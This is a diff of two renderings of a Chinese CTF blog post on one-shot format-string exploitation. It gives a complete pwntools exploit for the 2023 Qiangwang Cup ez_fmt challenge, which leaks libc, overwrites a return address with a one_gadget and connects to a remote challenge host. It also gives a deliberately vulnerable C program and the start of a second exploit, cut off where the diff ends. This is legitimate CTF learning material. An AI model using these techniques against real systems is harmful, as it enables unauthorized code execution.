@@ -1,248 +1,121 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-  <title>
-    
-    一次性格式化字符串利用 丨
-    
-
-    tw11ty&#39;s Blog
-  </title>
-
+  <meta charset="utf-8">
   
-  <link rel="shortcut icon" href="/icon.svg">
   
-
-  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <title>一次性格式化字符串利用 | tw11ty</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="一次性格式化字符串【2023 强网杯】ez_fmt没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算 改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串 12345678910111213141516171819202122232425262">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次性格式化字符串利用">
+<meta property="og:url" content="http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="tw11ty">
+<meta property="og:description" content="一次性格式化字符串【2023 强网杯】ez_fmt没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算 改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串 12345678910111213141516171819202122232425262">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071529364.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071611393.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071615607.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071632618.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071654277.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071712038.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406081607924.png">
+<meta property="article:published_time" content="2024-06-08T08:43:06.000Z">
+<meta property="article:modified_time" content="2024-07-14T12:10:57.456Z">
+<meta property="article:author" content="tw11ty">
+<meta property="article:tag" content="fmt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071529364.png">
   
-  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
-  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+    <link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
   
-
-  <!-- 字体 -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
-
   
-<link rel="stylesheet" href="/css/root.css">
-
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
   
 <link rel="stylesheet" href="/css/style.css">
 
   
-<link rel="stylesheet" href="/css/post.css">
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-<link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+  
+  
+</head>
 
 <body>
-  <header class="header">
-  <section class="header-container">
-    <a class="logo" href="/">tw11ty</a>
-    <ul class="nav">
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">tw11ty</a>
+      </h1>
       
-      <li><a href="/archives">归档</a></li>
-      
-      <li><a href="/about">关于</a></li>
-      
-      <li><a href="/group">友链</a></li>
-      
-    </ul>
-  </section>
-</header>
-  <main class="main">
-    <article class="post">
-  
-  <div class="post-title">一次性格式化字符串利用</div>
-  <div class="post-meta">
-    <div class="date">2024 June 8th</div>
-    <div class="tags">
-      
-      <div class="tag-item">fmt</div>
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">MyBlog</a>
+        </h2>
       
     </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://tw11ty.github.io"></form>
+      </div>
+    </div>
   </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-一次性格式化字符串利用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/" class="article-date">
+  <time class="dt-published" datetime="2024-06-08T08:43:06.000Z" itemprop="datePublished">2024-06-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      一次性格式化字符串利用
+    </h1>
   
 
-  <main class="post-content"><h1 id="一次性格式化字符串"><a href="#一次性格式化字符串" class="headerlink" title="一次性格式化字符串"></a>一次性格式化字符串</h1><h2 id="【2023-强网杯】ez-fmt"><a href="#【2023-强网杯】ez-fmt" class="headerlink" title="【2023 强网杯】ez_fmt"></a>【2023 强网杯】ez_fmt</h2><p>没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算</p>
-<p>改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32
-<span class="comment">#from ctypes import *</span>
-<span class="comment">#from LibcSearcher import *</span>
-
-s    = <span class="keyword">lambda</span> data               : io.send(data)
-sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)
-sl   = <span class="keyword">lambda</span> data               : io.sendline(data)
-sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)
-r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)
-ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)
-itr  = <span class="keyword">lambda</span>                    : io.interactive()
-r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)
-r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]
-uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))
-uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))
-leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">"&#123;&#125;:0x&#123;:x&#125;"</span>.<span class="built_in">format</span>(name,value))
-
-<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):
-    gdb.attach(io,cmd)
-    pause()
-
-<span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">data1,data2</span>):   <span class="comment">#payload = b&#x27;%&#x27; + str(data) + b&#x27;c&#x27; + padding + &#x27;%&#x27; + str(offset) + b&#x27;$hhn&#x27; + p64(adr)</span>
-    padding1  = <span class="string">b&#x27;&#x27;</span>
-    padding2  = <span class="string">b&#x27;&#x27;</span>
-    data2     = data2-data1  
-    payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span>
-    <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)<<span class="number">0x10</span>):
-        padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))
-        data1    -= <span class="built_in">len</span>(padding1)
-        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span>
-        <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)<<span class="number">0x10</span>):
-            padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))
-            payload1   = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span>
-
-    payload2 = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span>
-    <span class="built_in">print</span>(payload2)
-    <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)<<span class="number">0x20</span>):
-        padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))
-        data2    -= <span class="built_in">len</span>(padding2)
-        payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span>
-        <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)<<span class="number">0x20</span>):
-            padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))
-            payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span>
-    payload2 += p64(ret_addr) + p64(ret_addr+<span class="number">2</span>)
-    <span class="keyword">return</span> payload2
-
-<span class="keyword">def</span> <span class="title function_">pwn</span>():
-    py1 = <span class="string">b&#x27;%4198917c%9$hn%19$paaaaa&#x27;</span> + p64(printf_ret)
-    <span class="comment"># debug()</span>
-    s(py1)
-    ru(<span class="string">b&#x27;0x&#x27;</span>)
-    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span>
-    leak(<span class="string">"libc_base"</span> , libc_base)
-    one_gadget = libc_base + <span class="number">0xe3b01</span>
-    <span class="comment"># debug()</span>
-    py2 = fmt(one_gadget&<span class="number">0xffff</span>,(one_gadget>><span class="number">16</span>)&<span class="number">0xffff</span>)
-    s(py2)
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
-    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   
-    pwn_arch = <span class="string">&#x27;amd64&#x27;</span>
-    pwn_os = <span class="string">&#x27;linux&#x27;</span>
-    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)
-    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]
-    pwnfile = <span class="string">&#x27;./ez_fmt&#x27;</span>
-    io = process(pwnfile)
-    io = remote(<span class="string">&#x27;47.104.24.40&#x27;</span>,<span class="number">1337</span>)
-
-    elf = ELF(pwnfile)
-    rop = ROP(pwnfile)
-    context.binary = pwnfile
-    libc_name  = <span class="string">&#x27;./libc-2.31.so&#x27;</span>
-    libc = ELF(libc_name) 
-
-    fini_arry = <span class="number">0x0403DC0</span>
-    main      = elf.sym[<span class="string">&#x27;main&#x27;</span>]
+      </header>
     
-    ru(<span class="string">b&#x27;0x&#x27;</span>)
-    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)
-    ret_addr   = stack + <span class="number">0x68</span>
-    printf_ret = stack - <span class="number">0x8</span>
-    leak(<span class="string">"print_ret"</span>,printf_ret)
-    leak(<span class="string">"ret_addr"</span>,ret_addr)
-    pwn()
-
-    itr()
-</code></pre>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="一次性格式化字符串"><a href="#一次性格式化字符串" class="headerlink" title="一次性格式化字符串"></a>一次性格式化字符串</h1><h2 id="【2023-强网杯】ez-fmt"><a href="#【2023-强网杯】ez-fmt" class="headerlink" title="【2023 强网杯】ez_fmt"></a>【2023 强网杯】ez_fmt</h2><p>没开pie，开了 full Relro，改不了got和fini_array，也给了buf地址，栈上地址用偏移算</p>
+<p>改printf_ret地址，绕过w&#x3D;&#x3D;0xffff的限制，控制程序再次执行read 0x00401205  再次执行格式化字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)</span><br><span class="line">sl   = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)</span><br><span class="line">r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)</span><br><span class="line">itr  = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">&quot;&#123;&#125;:0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(name,value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">data1,data2</span>):   <span class="comment">#payload = b&#x27;%&#x27; + str(data) + b&#x27;c&#x27; + padding + &#x27;%&#x27; + str(offset) + b&#x27;$hhn&#x27; + p64(adr)</span></span><br><span class="line">    padding1  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    padding2  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    data2     = data2-data1  </span><br><span class="line">    payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">        padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">        data1    -= <span class="built_in">len</span>(padding1)</span><br><span class="line">        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">            padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">            payload1   = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload2 = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(payload2)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">        padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">        data2    -= <span class="built_in">len</span>(padding2)</span><br><span class="line">        payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">            padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">            payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    payload2 += p64(ret_addr) + p64(ret_addr+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> payload2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    py1 = <span class="string">b&#x27;%4198917c%9$hn%19$paaaaa&#x27;</span> + p64(printf_ret)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(py1)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span> , libc_base)</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    py2 = fmt(one_gadget&amp;<span class="number">0xffff</span>,(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">    s(py2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   </span><br><span class="line">    pwn_arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    pwn_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    pwnfile = <span class="string">&#x27;./ez_fmt&#x27;</span></span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    io = remote(<span class="string">&#x27;47.104.24.40&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    rop = ROP(pwnfile)</span><br><span class="line">    context.binary = pwnfile</span><br><span class="line">    libc_name  = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line">    libc = ELF(libc_name) </span><br><span class="line"></span><br><span class="line">    fini_arry = <span class="number">0x0403DC0</span></span><br><span class="line">    main      = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    ret_addr   = stack + <span class="number">0x68</span></span><br><span class="line">    printf_ret = stack - <span class="number">0x8</span></span><br><span class="line">    leak(<span class="string">&quot;print_ret&quot;</span>,printf_ret)</span><br><span class="line">    leak(<span class="string">&quot;ret_addr&quot;</span>,ret_addr)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>自己出的练手题  没开RELRO，直接打fini_array绕过一次性格式化字符串</p>
-<pre class=" language-highlight c"><span class="meta">#<span class="keyword">include</span><span class="string"><code class="language-highlight c"><span class="meta">#<span class="keyword">include</span><span class="string"><stdio.h></span></span>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init_func();</span><br><span class="line">    <span class="type">char</span> str[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input your payload:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc fmt.c -no-pie -z norelro  -o fmt </span></span><br></pre></td></tr></table></figure>
 
-<span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;
-    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);
-    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);
-    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);
-    <span class="keyword">return</span> <span class="number">0</span>;
-&#125;
-
-<span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;
-    init_func();
-    <span class="type">char</span> str[<span class="number">0x100</span>];
-    <span class="built_in">printf</span>(<span class="string">"please input your payload:"</span>);
-    read(<span class="number">0</span>, str, <span class="number">0x100</span>);
-    <span class="built_in">printf</span>(str);
-&#125;
-
-<span class="comment">//gcc fmt.c -no-pie -z norelro  -o fmt </span></code></pre>
-
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32
-<span class="comment">#from ctypes import *</span>
-<span class="comment">#from LibcSearcher import *</span>
-<span class="comment">#from struct import pack</span>
-
-s    = <span class="keyword">lambda</span> data               : io.send(data)
-sl   = <span class="keyword">lambda</span> data               : io.sendline(data)
-sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)
-sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)
-r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)
-ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)
-itr  = <span class="keyword">lambda</span>                    : io.interactive()
-r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)
-r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]
-uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))
-uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))
-leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">"&#123;&#125;:0x&#123;:x&#125;"</span>.<span class="built_in">format</span>(name,value))
-
-<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):
-    gdb.attach(io,cmd)
-    pause()
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
-    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   <span class="comment">#&#x27;info&#x27;</span>
-    pwn_arch = <span class="string">&#x27;amd64&#x27;</span>
-    pwn_os = <span class="string">&#x27;linux&#x27;</span>
-    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)
-    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]
-    pwnfile = <span class="string">&#x27;./fmt&#x27;</span>
-    <span class="comment">#io = process(pwnfile)</span>
